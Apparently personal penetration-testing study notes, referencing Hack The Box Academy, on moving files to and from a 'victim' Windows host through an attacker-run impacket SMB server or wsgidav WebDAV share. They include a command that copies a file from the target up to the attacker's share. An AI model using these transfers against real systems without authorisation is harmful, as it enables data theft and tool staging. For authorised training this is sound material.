Notes: For Linux victim to able to mount to your smb server, CIFS utility are required to be present on target system, if possible, when dealing with Linux victim, choose other FT method

Preparation:

Starting a SMB Server:
```
sudo impacket-smbserver share -smb2support <directory_to_share>
#If target system do not support smbshare w/o username and pw
sudo impacket-smbserver share -smb2support -username <username> -password '<password>' <directory_to_share> 
```

Alternative -- Starting a WebDav server instead
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```


Interacting:

Mounting SMB server (Windows):

```
net use <drive_label>: \\<server-ip>\shareName /user:myuser mypass
```

Copying File from SMB server (Windows):
```
copy \\<ip>\<sharename>\<file>
```

Accessing SMB server w/o powershell / command prompt (Windows):
```
1. Open File Explorer
2. Type \\<ip>\<sharename> in the address bar
```

Listing WebDav server(Windows):
```
dir \\<ip>\DavWWWRoot
#if sucessful
copy <abspath_of_file_to_upload> \\<ip>\DavWWWRoot
```

Ref: https://academy.hackthebox.com/app/module/24/section/514 / https://academy.hackthebox.com/app/module/24/section/160